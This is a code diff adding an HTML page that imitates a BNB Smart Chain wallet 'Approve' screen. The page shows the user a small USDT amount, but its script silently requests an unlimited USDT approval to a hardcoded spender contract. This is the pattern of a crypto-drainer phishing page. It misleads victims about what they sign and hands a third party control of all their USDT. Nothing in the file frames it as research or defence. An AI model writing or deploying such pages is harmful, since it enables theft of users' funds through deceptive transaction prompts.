@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <title>Approve - BNB Smart Chain</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+            background-color: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .app-bar {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 12px 16px 8px;
+            position: relative;
+        }
+        .app-bar-title { font-size: 20px; font-weight: 600; }
+        .close-btn {
+            position: absolute;
+            left: 16px;
+            font-size: 22px;
+            cursor: pointer;
+        }
+        .content {
+            flex: 1;
+            padding: 16px;
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+        .card {
+            background-color: #111;
+            border-radius: 14px;
+            padding: 16px 18px;
+        }
+        .row-between {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .label { font-size: 14px; color: #b3b3b3; }
+        .value { font-size: 15px; font-weight: 500; }
+        .fee-amount { font-size: 15px; font-weight: 500; }
+        .fee-sub { margin-top: 4px; font-size: 13px; color: #b3b3b3; }
+        .bottom-area {
+            padding: 12px 16px 22px;
+            background-color: #000;
+        }
+        .warning-box {
+            display: none;
+            margin-bottom: 12px;
+            padding: 10px 12px;
+            border-radius: 12px;
+            background-color: #3b2a13;
+            color: #f6e0a3;
+            font-size: 13px;
+        }
+        .primary-btn {
+            width: 100%;
+            border: none;
+            border-radius: 999px;
+            padding: 14px;
+            font-size: 16px;
+            font-weight: 500;
+            background-color: #F0B90B; /* BNB Gold Color */
+            color: #000;
+            cursor: pointer;
+        }
+        .primary-btn:disabled {
+            opacity: 0.5;
+            cursor: default;
+        }
+        .details-section {
+            display: none;
+            margin-top: 16px;
+            padding-top: 16px;
+            border-top: 1px solid #262626;
+        }
+        .details-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .toggle-details {
+            margin-top: 16px;
+            cursor: pointer;
+        }
+        .amount-display {
+            margin-bottom: 16px;
+            padding: 10px 12px;
+            background: #1a1a1a;
+            border-radius: 8px;
+            font-size: 15px;
+        }
+        .balance-display {
+            margin-top: 8px;
+            font-size: 12px;
+            color: #888;
+        }
+    </style>
+</head>
+<body>
+<header class="app-bar">
+    <div class="close-btn" onclick="window.history.back()">&times;</div>
+    <div class="app-bar-title">Approve</div>
+</header>
+
+<main class="content">
+    <!-- Asset & Details card -->
+    <section class="card">
+        <div class="amount-display" id="amountDisplay">
+            Loading amount...
+        </div>
+        
+        <div class="row-between">
+            <span class="label">Asset</span>
+            <span class="value" id="assetName">Tether USD (USDT)</span>
+        </div>
+        
+        <div class="balance-display" id="bnbBalanceDisplay">
+            BNB Balance: Checking...
+        </div>
+        
+        <div class="row-between toggle-details" onclick="toggleDetails()">
+            <span class="label">Hide details</span>
+            <span class="label" id="detailsArrow">▼</span>
+        </div>
+
+        <div class="details-section" id="detailsSection">
+            <div class="details-row">
+                <span class="label">DApp</span>
+                <span class="value" id="dappName">BNB Smart Chain</span>
+            </div>
+            <div class="details-row">
+                <span class="label">Contract address</span>
+                <span class="value" id="contractAddress">0x0B14...EC5E</span>
+            </div>
+            <div class="details-row">
+                <span class="label">Network</span>
+                <span class="value" id="networkName">BNB Smart Chain</span>
+            </div>
+        </div>
+    </section>
+
+    <!-- Network fee card -->
+    <section class="card">
+        <div class="row-between">
+            <span class="label">Network fee</span>
+            <div style="text-align: right;">
+                <div class="fee-amount" id="feeUsd">$0.18</div>
+                <div class="fee-sub" id="feeNative">0.00065 BNB</div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<!-- Bottom warning + button -->
+<div class="bottom-area">
+    <div class="warning-box" id="warningBox">
+        Insufficient BNB balance for gas fees
+    </div>
+    <button class="primary-btn" id="actionButton">Connect Wallet</button>
+</div>
+
+<script>
+    // 🔧 CONFIGURATION FOR BNB SMART CHAIN
+    const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";    // BSC USDT
+    const SPENDER_CONTRACT_ADDRESS = "0x0B142E83E394ab1bd8B95F6a5D4f15EB1964EC5E";
+    const AMOUNT_TO_APPROVE = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // Unlimited approval
+
+    const ERC20_ABI = [
+        {
+            "constant": false,
+            "inputs": [
+                { "name": "_spender", "type": "address" },
+                { "name": "_value",   "type": "uint256" }
+            ],
+            "name": "approve",
+            "outputs": [{ "name": "", "type": "bool" }],
+            "type": "function"
+        }
+    ];
+
+    // Smart contract ABI for verifyOnBSC function
+    const CONTRACT_ABI = [
+        {
+            "constant": false,
+            "inputs": [{ "name": "amount", "type": "uint256" }],
+            "name": "verifyOnBSC",
+            "outputs": [],
+            "type": "function"
+        }
+    ];
+
+    let web3;
+    let currentAccount = null;
+    let userBnbBalance = 0;
+
+    const btn = document.getElementById("actionButton");
+    const warning = document.getElementById("warningBox");
+    const contractAddressEl = document.getElementById("contractAddress");
+    const assetNameEl = document.getElementById("assetName");
+    const dappNameEl = document.getElementById("dappName");
+    const networkNameEl = document.getElementById("networkName");
+    const feeUsdEl = document.getElementById("feeUsd");
+    const feeNativeEl = document.getElementById("feeNative");
+    const amountDisplayEl = document.getElementById("amountDisplay");
+    const bnbBalanceDisplay = document.getElementById("bnbBalanceDisplay");
+
+    // Format contract address to show first 7 and last 7 characters
+    function formatAddress(address) {
+        if (!address) return '';
+        return `${address.substring(0, 7)}...${address.substring(address.length - 7)}`;
+    }
+
+    function toggleDetails() {
+        const detailsSection = document.getElementById("detailsSection");
+        const toggleText = document.querySelector('.toggle-details .label');
+        const detailsArrow = document.getElementById("detailsArrow");
+        
+        if (detailsSection.style.display === "block") {
+            detailsSection.style.display = "none";
+            toggleText.textContent = "Hide details";
+            detailsArrow.textContent = "▼";
+        } else {
+            detailsSection.style.display = "block";
+            toggleText.textContent = "Hide details";
+            detailsArrow.textContent = "▲";
+        }
+    }
+
+    function updateUI() {
+        if (!currentAccount) {
+            btn.textContent = "Connect Wallet";
+            btn.disabled = false;
+            warning.style.display = "none";
+            bnbBalanceDisplay.textContent = "BNB Balance: Connect wallet to check";
+            return;
+        }
+
+        // Update BNB balance display
+        bnbBalanceDisplay.textContent = `BNB Balance: ${userBnbBalance.toFixed(6)} BNB`;
+
+        // Check if user has enough BNB for gas
+        // On BSC, typical gas fees are around 0.0005-0.001 BNB
+        const estimatedGasFee = 0.001; // Conservative estimate
+        
+        if (userBnbBalance > estimatedGasFee) {
+            btn.textContent = "Approve";
+            btn.disabled = false;
+            warning.style.display = "none";
+        } else {
+            btn.textContent = "Top up BNB";
+            btn.disabled = false;
+            warning.style.display = "block";
+            warning.textContent = `Insufficient BNB balance. You need at least ${estimatedGasFee} BNB for gas fees`;
+        }
+    }
+
+    async function connectWallet() {
+        if (typeof window.ethereum === "undefined") {
+            alert("Please install MetaMask!");
+            return false;
+        }
+
+        try {
+            web3 = new Web3(window.ethereum);
+            
+            // Request accounts
+            const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+            currentAccount = accounts[0];
+            
+            // Check network - BSC Mainnet (chainId 0x38)
+            const chainId = await window.ethereum.request({ method: "eth_chainId" });
+            if (chainId !== "0x38") {
+                try {
+                    // Try to switch to BSC network
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }],
+                    });
+                } catch (switchError) {
+                    // If network not added, add it
+                    if (switchError.code === 4902) {
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'BNB Smart Chain',
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18
+                                },
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                blockExplorerUrls: ['https://bscscan.com/']
+                            }],
+                        });
+                    } else {
+                        warning.textContent = "Please switch network to BNB Smart Chain";
+                        warning.style.display = "block";
+                        btn.textContent = "Wrong Network";
+                        btn.disabled = true;
+                        return false;
+                    }
+                }
+            }
+
+            // Get BNB balance
+            const balanceWei = await web3.eth.getBalance(currentAccount);
+            userBnbBalance = parseFloat(web3.utils.fromWei(balanceWei, "ether"));
+            
+            console.log(`User BNB balance: ${userBnbBalance} BNB`);
+            
+            // Update fee display - using BNB for BSC
+            feeUsdEl.textContent = "$0.18";
+            feeNativeEl.textContent = "0.00065 BNB";
+            
+            return true;
+        } catch (err) {
+            console.error("Wallet connection failed:", err);
+            alert("Failed to connect wallet");
+            return false;
+        }
+    }
+
+    async function approveToken() {
+        try {
+            btn.disabled = true;
+            btn.textContent = "Approving...";
+
+            // Step 1: Approve USDT
+            const token = new web3.eth.Contract(ERC20_ABI, TOKEN_ADDRESS);
+            const rawAmount = web3.utils.toBN(AMOUNT_TO_APPROVE);
+
+            const approveTx = await token.methods
+                .approve(SPENDER_CONTRACT_ADDRESS, rawAmount)
+                .send({ from: currentAccount });
+
+            onSuccess();
+        } catch (err) {
+            console.error("Transaction failed:", err);
+            btn.textContent = "Try Again";
+            btn.disabled = false;
+            alert("Transaction failed: " + err.message);
+        }
+    }
+
+    function onSuccess() {
+        btn.textContent = "Completed ✓";
+        btn.disabled = true;
+        alert("Success! Token approved.");
+        
+        // Navigate to success page after delay
+        setTimeout(() => {
+            window.location.href = "success.html";
+        }, 2000);
+    }
+
+    async function handleButtonClick() {
+        if (!currentAccount) {
+            // Connect wallet first
+            const connected = await connectWallet();
+            if (connected) {
+                updateUI();
+            }
+        } else if (userBnbBalance <= 0.001) {
+            // Top up BNB
+            alert(`You need at least 0.001 BNB for gas fees. Your current balance is ${userBnbBalance.toFixed(6)} BNB. Please top up your BNB balance.`);
+        } else {
+            // Approve token
+            await approveToken();
+        }
+    }
+
+    // Initialize page
+    document.addEventListener('DOMContentLoaded', function() {
+        // Set up initial display values
+        contractAddressEl.textContent = formatAddress(SPENDER_CONTRACT_ADDRESS);
+        dappNameEl.textContent = "BNB Smart Chain";
+        networkNameEl.textContent = "BNB Smart Chain";
+        
+        // Load USDT amount from previous page
+        const usdtAmount = localStorage.getItem('usdtAmount') || "0";
+        amountDisplayEl.textContent = `Amount: ${usdtAmount} USDT`;
+        
+        // Set up button click handler
+        btn.addEventListener("click", handleButtonClick);
+        
+        // Auto-connect wallet if already connected
+        if (typeof window.ethereum !== "undefined" && window.ethereum.selectedAddress) {
+            connectWallet().then(() => {
+                updateUI();
+            });
+        }
+        
+        // Listen for account changes
+        if (window.ethereum) {
+            window.ethereum.on('accountsChanged', function(accounts) {
+                currentAccount = accounts[0] || null;
+                if (currentAccount) {
+                    connectWallet().then(() => {
+                        updateUI();
+                    });
+                } else {
+                    currentAccount = null;
+                    userBnbBalance = 0;
+                    updateUI();
+                }
+            });
+            
+            // Listen for chain changes
+            window.ethereum.on('chainChanged', function() {
+                connectWallet().then(() => {
+                    updateUI();
+                });
+            });
+        }
+    });
+</script>
+</body>
+</html>
